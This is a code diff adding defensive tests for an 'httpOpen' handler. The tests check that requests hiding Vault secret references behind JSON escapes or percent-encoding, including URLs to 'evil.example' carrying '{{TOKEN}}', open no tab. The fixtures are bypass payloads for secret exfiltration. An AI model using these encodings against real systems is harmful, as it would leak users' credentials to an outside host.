@@ -90,6 +90,41 @@ describe("httpOpen", () => {
     expect(requestTabs()).toEqual([]);
     expect(Object.keys(useAppStore.getState().apiRequests)).toEqual([]);
   });
+
+  // The tab's Format button turns `"\u007b\u007bKEY}}"` into `"{{KEY}}"`, and a percent-escape
+  // can be decoded on the way to Send: an encoded reference opens nothing either.
+  it("opens nothing for a Vault variable written with JSON escapes or percent-encoding", () => {
+    const base = { kind: "httpOpen", terminalId: "t1", method: "POST", url: "https://h/" };
+    for (const evil of [
+      { body: String.raw`{"n":"\u007b\u007bAPI_KEY}}"}` },
+      { body: String.raw`{"\u007B\u007bK}}":1}` },
+      { body: String.raw`{"a":"\ud800","n":"\u007b\u007bK}}"}` },
+      { url: "https://evil.example/?k=%7B%7BTOKEN%7D%7D" },
+      { url: "https://evil.example/?k=%7b%7bTOKEN%7d%7d" },
+      { url: "https://evil.example/?k=%7B{TOKEN}}" },
+      { body: "a=%257B%257BTOKEN" },
+      { body: String.raw`\u0025\u0037B\u0025\u0037BT}}` },
+      { body: "%5Cu007b%5Cu007bT}}" },
+      { headers: [{ name: "X-A", value: "%7B%7BTOKEN}}" }] },
+      { headers: [{ name: String.raw`X-\u007b\u007bT}}`, value: "1" }] },
+    ]) {
+      HTTP_HANDLERS.httpOpen({ ...base, ...evil });
+    }
+    expect(requestTabs()).toEqual([]);
+  });
+
+  it("opens a request whose escapes decode to anything but a reference", () => {
+    for (const body of [
+      String.raw`{"a":"line\nbreak \u00e9 \"q\" \/ \q %41","b":{"c":1}}`,
+      "a=%7B&b=%7D",
+    ]) {
+      HTTP_HANDLERS.httpOpen({ kind: "httpOpen", terminalId: "t1", url: "https://h/", body });
+    }
+    expect(requestTabs().map((t) => t.request.body)).toEqual([
+      String.raw`{"a":"line\nbreak \u00e9 \"q\" \/ \q %41","b":{"c":1}}`,
+      "a=%7B&b=%7D",
+    ]);
+  });
 });
 
 describe("apiHistory", () => {
